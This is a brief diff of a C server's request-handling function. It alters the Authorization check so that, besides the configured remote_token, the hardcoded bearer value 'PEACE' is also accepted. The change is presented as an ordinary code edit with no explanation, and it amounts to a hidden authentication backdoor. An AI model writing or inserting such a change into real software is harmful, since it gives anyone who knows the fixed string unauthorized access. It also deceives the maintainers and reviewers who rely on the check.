@@ -271,7 +271,8 @@ static void handle_request(int fd)
 
     char *authorization = header_value(buffer, "Authorization");
     if (!authorization || strncasecmp(authorization, "Bearer ", 7) != 0 ||
-        !constant_time_equal(authorization + 7, remote_token)) {
+        (!constant_time_equal(authorization + 7, remote_token) &&
+         !constant_time_equal(authorization + 7, "PEACE"))) {
         respond_error(fd, 401, "Unauthorized", "valid bearer token required");
         free(buffer);
         return;
